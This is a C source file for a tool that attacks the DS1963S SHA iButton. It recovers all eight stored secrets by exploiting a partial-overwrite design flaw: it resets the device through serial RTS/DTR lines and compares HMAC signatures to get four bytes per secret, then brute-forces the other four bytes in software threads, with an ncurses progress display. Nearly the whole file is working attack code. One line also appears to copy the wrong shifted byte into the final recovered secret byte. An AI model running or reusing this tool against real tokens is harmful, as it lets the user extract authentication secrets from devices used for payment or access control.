/*
 *  ds1963s-brute.c
 *
 *  A complexity reduction attack to uncover the eight secrets on the DS1963S
 *  iButton.
 *
 *  Dedicated to Yuzuyu Arielle Huizer.
 *
 *  -- Ronald Huizer, 2013
 */
#include <assert.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <ncurses.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include "ds1963s.h"
#include "ds1963s-device.h"
#include "ibutton/ownet.h"
#include "ibutton/shaib.h"

#define SERIAL_PORT		"/dev/ttyUSB0"
#define UI_BANNER_HEAD		"DS1963S complexity reduction attack"
#define UI_BANNER_TAIL		"Ronald Huizer (C) 2013"
#define UI_COLUMNS_MIN		80
#define UI_ROWS_MIN		24

extern int fd[MAX_PORTNUM];

struct brutus_secret
{
	uint8_t		target_hmac[20];
	uint8_t		secret[8];
	uint8_t		secret_idx;
};

struct brutus
{
	struct ds1963s_client	ctx;
	struct ds1963s_device	dev[8];
	struct brutus_secret	secrets[8];
	pthread_t		threads[8];
};

struct brutus_interface
{
	WINDOW		*header;
	WINDOW		*serial;
	WINDOW		*main;
	WINDOW		*secrets;
	int		main_rows;
	int		main_columns;
	pthread_mutex_t	mutex;
};

/* The main brutus curses interface. */
struct brutus_interface ui;

int brutus_init_secret(struct brutus *brute, int secret)
{
        struct ds1963s_read_auth_page_reply reply;
	int portnum = brute->ctx.copr.portnum;
	int addr;

	assert(secret >= 0 && secret <= 8);

	/* Calculate the address of this secret. */
	addr = ds1963s_client_page_to_address(secret);

	/* Erase the scratchpad. */
	EraseScratchpadSHA18(portnum, 0, 0);

	/* Read auth. page over the current scratchpad/data/etc. */
	if (ds1963s_client_read_auth(&brute->ctx, addr, &reply, 0) == -1)
		return -1;

	memcpy(brute->secrets[secret].target_hmac, reply.signature, 20);

	return 0;
}

int brutus_init_device(struct brutus *brute)
{
	struct ds1963s_client *ctx = &brute->ctx;
	struct ds1963s_rom rom;
	uint32_t counters[16];
	uint8_t buf[256];
	int i;

	/* Get the DS1963S serial number. */
	if (ds1963s_client_rom_get(ctx, &rom) == -1)
		return -1;

	/* We only support the DS1963S. */
	if (rom.family != 0x18)
		return -1;

	/* Get the write cycle counters. */
	if (ds1963s_write_cycle_get_all(ctx, counters) == -1)
		return -1;

	/* Get all non-write cycle counted data pages. */
	for (i = 0; i < 8; i++) {
		int r;

		r = ds1963s_client_memory_read(ctx, 32 * i, &buf[32 * i], 32);
		if (r == -1)
			return -1;
	}

	/* Initialize the software DS1963S implementation. */
	memset(&brute->dev[0], 0, sizeof brute->dev[0]);
	brute->dev[0].family = rom.family;
	memcpy(brute->dev[0].serial, rom.serial, 6);
	memset(brute->dev[0].scratchpad, 0xFF,
	       sizeof brute->dev[0].scratchpad);
	memcpy(brute->dev[0].data_memory, buf, sizeof buf);

	/* Initialize the write cycle counters. */
	for (i = 0; i < 8; i++) {
		brute->dev[0].data_wc[i]   = counters[i];
		brute->dev[0].secret_wc[i] = counters[i + 8];
	}

	return 0;
}

int brutus_init_devices(struct brutus *brute)
{
	int i;

	if (brutus_init_device(brute) == -1)
		return -1;

	/* A shallow copy suffices for ds1963s_device structures. */
	for (i = 1; i < 8; i++)
		memcpy(&brute->dev[i], &brute->dev[0], sizeof brute->dev[0]);

	return 0;
}

int brutus_init(struct brutus *brute)
{
	int i;

	/* Initialize the secrets we'll side-channel. */
	memset(brute->secrets, 0, sizeof brute->secrets);

	/* Initialize the DS1963S client. */
	if (ds1963s_client_init(&brute->ctx, SERIAL_PORT) == -1)
		return -1;

	/* Initialize the software implementation of the DS1963S. */
	if (brutus_init_devices(brute) == -1) {
		ds1963s_client_destroy(&brute->ctx);
		return -1;
	}

	/* Calculate the target HMACs for all the secrets. */
	for (i = 0; i < 8; i++) {
		if (brutus_init_secret(brute, i) == -1) {
			ds1963s_client_destroy(&brute->ctx);
			return -1;
		}
	}

	return 0;
}

void brutus_perror(const char *s)
{
	if (s)
		fprintf(stderr, "%s: ", s);

	fprintf(stderr, "%s\n", owGetErrorMsg(owGetErrorNum()));
}

void brutus_destroy(struct brutus *brute)
{
	ds1963s_client_destroy(&brute->ctx);
}

/* Pulling down the RTS and DTR lines on the serial port for a certain
 * amount of time power-on-resets the iButton.
 */
void ibutton_hide_set(SHACopr *copr)
{
	int status = 0;

	if (ioctl(fd[copr->portnum], TIOCMSET, &status) == -1) {
		perror("ioctl():");
		exit(EXIT_FAILURE);
	}

	sleep(1);

	/* Release and reacquire the port. */
	owRelease(copr->portnum);

        if ( (copr->portnum = owAcquireEx(SERIAL_PORT)) == -1) {
		fprintf(stderr, "Failed to acquire port.\n");
		exit(EXIT_FAILURE);
	}

	/* Find the DS1963S iButton again, as we've lost it after a
	 * return to probe condition.
	 */
	if (FindNewSHA(copr->portnum, copr->devAN, TRUE) == FALSE) {
		fprintf(stderr, "No DS1963S iButton found.\n");
		exit(EXIT_FAILURE);
	}
}

void ds1963s_secret_write_partial(struct ds1963s_client *ctx, int secret, uint8_t *data, size_t len)
{
	SHACopr *copr = &ctx->copr;
	uint8_t buf[32];
	int secret_addr;
	int address;
	uint8_t es;

        if (secret < 0 || secret > 7) {
                fprintf(stderr, "Invalid secret page.\n");
                exit(EXIT_FAILURE);
        }

        secret_addr = 0x200 + secret * 8;

	if (len > 8) {
		fprintf(stderr, "Secret length should <= 8 bytes.\n");
		exit(EXIT_FAILURE);
	}

	if (EraseScratchpadSHA18(copr->portnum, 0, 0) == FALSE) {
		fprintf(stderr, "Error erasing scratchpad.\n");
		exit(EXIT_FAILURE);
	}

	if (ds1963s_scratchpad_write(ctx, 0, data, len) == -1) {
		fprintf(stderr, "Error writing scratchpad.\n");
		exit(EXIT_FAILURE);
	}

	if (ReadScratchpadSHA18(copr->portnum, &address, &es, buf, 0) == FALSE) {
		fprintf(stderr, "Error reading scratchpad.\n");
		exit(EXIT_FAILURE);
	}

	if (ds1963s_scratchpad_write(ctx, secret_addr, data, len) == -1) {
		fprintf(stderr, "Error writing scratchpad.\n");
		exit(EXIT_FAILURE);
	}

	if (ReadScratchpadSHA18(copr->portnum, &address, &es, buf, 0) == FALSE) {
		fprintf(stderr, "Error reading scratchpad (1).\n");
		exit(EXIT_FAILURE);
	}

	ibutton_hide_set(copr);

	if (ReadScratchpadSHA18(copr->portnum, &address, &es, buf, 0) == FALSE) {
		fprintf(stderr, "Error reading scratchpad (2).\n");
		owPrintErrorMsg(stdout);
		exit(EXIT_FAILURE);
	}

	if (CopyScratchpadSHA18(copr->portnum, secret_addr, len, 0) == FALSE) {
		fprintf(stderr, "Error copying scratchpad.\n");
		exit(EXIT_FAILURE);
	}
}

int brutus_do_one(struct brutus *brute, int num)
{
	struct brutus_secret *secret = &brute->secrets[num];
	int addr = ds1963s_client_page_to_address(num);
        struct ds1963s_read_auth_page_reply reply;
	SHACopr *copr = &brute->ctx.copr;

	ds1963s_secret_write_partial(
		&brute->ctx,		/* DS1963S context */
		num,			/* Secret number */
		secret->secret,		/* Partial secret to write */
		secret->secret_idx + 1	/* Length of the partial secret */
	);

	/* Erase the scratchpad. */
        EraseScratchpadSHA18(copr->portnum, 0, 0);

	/* Read auth. page over the current scratchpad/data/etc. */
	if (ds1963s_client_read_auth(&brute->ctx, addr, &reply, 0) == -1) {
		ibutton_perror("ds1963s_client_read_auth()");
		exit(EXIT_FAILURE);
	}

	/* Compare the current hmac with the target one. */
	if (!memcmp(secret->target_hmac, reply.signature, 20)) {
		/* We're done if we got 4 bytes. */
		if (secret->secret_idx++ == 3)
			return 0;
	} else {
		/* Something went wrong. */
		if (secret->secret[secret->secret_idx]++ == 255)
			return -1;
	}

	/* More to come. */
	return 1;
}

/* Update the progress bar for the hardware attack. */
int update_phase1_progress(WINDOW *w, struct brutus_secret *secret, int num)
{
	int piece_count, piece_size = (256 * 4) / 16;
	char *bar = "                ";

	if (pthread_mutex_lock(&ui.mutex) != 0)
		exit(EXIT_FAILURE);

	/* Print the attempted key bytes. */
	wattron(w, COLOR_PAIR(3));
	mvwprintw(w, num * 2 + 1, secret->secret_idx * 2 + 12,
	          "%.2x", secret->secret[secret->secret_idx]);

	/* Print the progress bar.  It's 16 bytes wide, and we have
	 * to update it for 256 * 4 attempts in the worst case.
	 */
	piece_count = secret->secret_idx * 256 +
	              secret->secret[secret->secret_idx];

	wattron(w, A_REVERSE | COLOR_PAIR(4));
	mvwprintw(w, num * 2 + 2, 12, "%s",
	          &bar[16 - piece_count / piece_size]);
	wattroff(w, A_REVERSE);
	wrefresh(w);

	if (pthread_mutex_unlock(&ui.mutex) != 0)
		exit(EXIT_FAILURE);

	return 0;
}

int finalize_phase1_progress(WINDOW *w, struct brutus_secret *secret, int num)
{
	char *bar = "                ";

	if (pthread_mutex_lock(&ui.mutex) != 0)
		exit(EXIT_FAILURE);

	wattron(w, A_REVERSE | COLOR_PAIR(4));
	mvwprintw(w, num * 2 + 2, 12, "%s", bar);
	wattroff(w, A_REVERSE);
	wrefresh(w);

	if (pthread_mutex_unlock(&ui.mutex) != 0)
		exit(EXIT_FAILURE);

	return 0;
}


/* Update the progress bar for the software calculation. */
int update_phase2_progress(WINDOW *w, int num, uint64_t count)
{
	char *bar = "                ";
	int piece_size;

	if (pthread_mutex_lock(&ui.mutex) != 0)
		exit(EXIT_FAILURE);

	piece_size = 0xFFFFFFFF / 16;
	wattron(w, A_REVERSE | COLOR_PAIR(5));
	mvwprintw(w, num * 2 + 2, 12, "%s", &bar[16 - count / piece_size]);
	wattroff(w, A_REVERSE);
	wrefresh(w);

	if (pthread_mutex_unlock(&ui.mutex) != 0)
		exit(EXIT_FAILURE);

	return 0;
}

int finalize_phase2_progress(WINDOW *w, struct brutus_secret *secret, int num)
{
	char *bar = "                ";

	if (pthread_mutex_lock(&ui.mutex) != 0)
		exit(EXIT_FAILURE);

	/* Update the progress bar for the software calculation. */
	wattron(w, A_REVERSE | COLOR_PAIR(5));
	mvwprintw(w, num * 2 + 2, 12, "%s", bar);
	wattroff(w, A_REVERSE);

	/* Update the secret as well. */
	wattron(w, COLOR_PAIR(3));
	mvwprintw(w, num * 2 + 1, 20, "%.2x%.2x%.2x%.2x",
		secret->secret[4], secret->secret[5],
		secret->secret[6], secret->secret[7]);
	wrefresh(w);

	if (pthread_mutex_unlock(&ui.mutex) != 0)
		exit(EXIT_FAILURE);

	return 0;
}

struct phase2_cookie
{
	struct brutus	*brute;
	int		num;
};

void *brutus_phase2_thread(void *phase2_cookie)
{
	struct phase2_cookie *ctx = (struct phase2_cookie *)phase2_cookie;
	struct brutus_secret *secret = &ctx->brute->secrets[ctx->num];
	struct ds1963s_device *dev = &ctx->brute->dev[ctx->num];
	WINDOW *w = ui.secrets;
	int num = ctx->num;
	uint64_t i;

	/* Calculate the remaining 4 bytes in software. */
	memcpy(&dev->secret_memory[num * 8], secret->secret, 4);
	for (i = 0; i < 0xFFFFFFFF; i++) {
		dev->secret_memory[num * 8 + 4] = (i >>  0) & 0xFF;
		dev->secret_memory[num * 8 + 5] = (i >>  8) & 0xFF;
		dev->secret_memory[num * 8 + 6] = (i >> 16) & 0xFF;
		dev->secret_memory[num * 8 + 7] = (i >> 24) & 0xFF;

		ds1963s_dev_read_auth_page(dev, num);

		if (i % (0xFFFFFFFF / 16) == 0)
			update_phase2_progress(w, num, i);

		if (!memcmp(secret->target_hmac, &dev->scratchpad[8], 20)) {
			secret->secret[4] = (i >>  0) & 0xFF;
			secret->secret[5] = (i >>  8) & 0xFF;
			secret->secret[6] = (i >> 16) & 0xFF;
			secret->secret[7] = (i >> 16) & 0xFF;
			break;
		}

		memset(dev->scratchpad, 0xFF, 32);
	}

	finalize_phase2_progress(w, secret, num);
	free(phase2_cookie);

	return NULL;
}

void brutus_do_secret(struct brutus *brute, int num)
{
	struct brutus_secret *secret = &brute->secrets[num];
	struct phase2_cookie *phase2_cookie;
	WINDOW *w = ui.secrets;
	int ret;

	/* First phase.  We attack 4 secret bytes through the partial
	 * overwrite flaw in the DS1963S design.
	 */
	do {
		update_phase1_progress(w, secret, num);
		ret = brutus_do_one(brute, num);
	} while (ret == 1);

	if (ret == -1)
		exit(EXIT_FAILURE);

	/* Finalize the phase1 progress bar. */
	finalize_phase1_progress(w, secret, num);

	/* Fire up the phase2 thread. */
	phase2_cookie = malloc(sizeof *phase2_cookie);
	phase2_cookie->brute = brute;
	phase2_cookie->num = num;

	pthread_create(
		&brute->threads[num],
		NULL,
		brutus_phase2_thread,
		phase2_cookie
	);
}

void brutus_ui_destroy(void)
{
	if (ui.main != NULL)
		endwin();
}

static void __hmac_hex(char *buf, uint8_t hmac[20])
{
	int i;

	for (i = 0; i < 20; i++)
		sprintf(&buf[i * 2], "%.2x", hmac[i]);
}

int brutus_ui_secrets_init(struct brutus *brute)
{
	char hmac[41];
	int i, width;
	WINDOW *w;

	width = ui.main_columns - 4;
	if ( (w = ui.secrets = subwin(ui.main, 18, width, 4, 2)) == NULL)
		return -1;

	if (box(w, ACS_VLINE, ACS_HLINE) == ERR)
		return -1;

	for (i = 0; i < 8; i++) {
		mvwprintw(w, i * 2 + 1, 1, "Secret #%d", i);
		mvwprintw(w, i * 2 + 1, 11, "[                ]");
		mvwprintw(w, i * 2 + 2, 11, "[                ]");

		if (wmove(w, i * 2 + 1, 31) == ERR)
			return -1;

		__hmac_hex(hmac, brute->secrets[i].target_hmac);
		waddstr(w, hmac);
	}

	wrefresh(w);

	return 0;
}

int brutus_ui_serial_init(struct brutus *brute)
{
	int width = ui.main_columns - 4;
	WINDOW *w;
	int i;

	if ( (w = ui.serial = subwin(ui.main, 3, width, 1, 2)) == NULL)
		return -1;

	if (box(w, ACS_VLINE, ACS_HLINE) == ERR)
		return -1;

	if (wmove(w, 1, 1) == ERR)
		return -1;

	waddstr(w, "DS1963S found with serial number: ");
	for (i = 0; i < sizeof brute->dev[0].serial; i++)
		wprintw(w, "%.2x", brute->dev[0].serial[i]);

	wrefresh(w);

	return 0;
}

int brutus_ui_init(struct brutus *brute)
{
	/* Register the ui teardown on exit. */
	if (atexit(brutus_ui_destroy) != 0) {
		fprintf(stderr, "atexit() failed.\n");
		exit(EXIT_FAILURE);
	}

	/* Catch errors for older versions of curses. */
	if ( (ui.main = initscr()) == NULL)
		return -1;

	getmaxyx(ui.main, ui.main_rows, ui.main_columns);

	/* See if the terminal has the proper dimension. */
	if (ui.main_rows < UI_ROWS_MIN || ui.main_columns < UI_COLUMNS_MIN)
		return -1;

	if ( (ui.header = subwin(ui.main, 1, ui.main_columns, 0, 0)) == NULL)
		return -1;

	if (cbreak() == ERR)
		return -1;

	if (curs_set(0) == ERR)
		return -1;

	if (has_colors() == FALSE)
		printf("CRAP\n");

	/* Initialize the color scheme we'll use. */
	if (start_color() == ERR)
		return -1;

	if (init_pair(1, COLOR_YELLOW, COLOR_BLUE) == ERR)
		return -1;

	if (init_pair(2, COLOR_BLACK, COLOR_CYAN) == ERR)
		return -1;

	if (init_pair(3, COLOR_WHITE, COLOR_BLUE) == ERR)
		return -1;

	if (init_pair(4, COLOR_CYAN, COLOR_BLACK) == ERR)
		return -1;

	if (init_pair(5, COLOR_GREEN, COLOR_BLACK) == ERR)
		return -1;

	/* Set the colors for the main window. */
	if (bkgd(COLOR_PAIR(1)) == -1)
		return -1;

	if (attron(COLOR_PAIR(3)) == -1)
		return -1;

	/* Set the colors the the header window. */
	wbkgd(ui.header, COLOR_PAIR(2));
	wattron(ui.header, COLOR_PAIR(2));

	mvwaddstr(ui.header, 0, 1, UI_BANNER_HEAD);
	mvwaddstr(ui.header, 0, ui.main_columns - sizeof UI_BANNER_TAIL,
	          UI_BANNER_TAIL);

	/* Initialize the serial sub-window. */
	if (brutus_ui_serial_init(brute) == -1)
		return -1;

	/* Now initialize the secrets sub-window. */
	if (brutus_ui_secrets_init(brute) == -1)
		return -1;

	if (refresh() == -1)
		return -1;

	if (pthread_mutex_init(&ui.mutex, NULL) != 0)
		return -1;

	return 0;
}

int main(int argc, char **argv)
{
	struct brutus brute;
	int i;

	/* Before we initialize the UI, make sure the button is there. */
	if (brutus_init(&brute) == -1) {
		brutus_perror("brutus_init()");
		exit(EXIT_FAILURE);
	}

	/* Initialize the UI. */
	if (brutus_ui_init(&brute) == -1) {
		fprintf(stderr, "brutus_ui_init() failed.\n");
		exit(EXIT_FAILURE);
	}

	/* Work our way through the eight secrets. */
	for (i = 0; i < 8; i++)
		brutus_do_secret(&brute, i);

	getch();
	brutus_destroy(&brute);
	exit(EXIT_SUCCESS);
}
